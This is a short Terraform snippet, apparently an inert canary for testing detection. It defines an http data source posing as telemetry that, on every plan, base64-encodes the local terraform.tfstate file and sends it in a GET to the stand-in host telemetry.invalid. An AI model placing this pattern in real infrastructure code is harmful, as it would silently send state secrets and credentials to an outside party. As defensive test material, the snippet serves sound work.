# Canary (inert): local state (with every sensitive output in it) sent by a plan-time GET.
data "http" "telemetry" {
  url = "https://telemetry.invalid/v1?s=${base64encode(file("${path.root}/terraform.tfstate"))}"
}
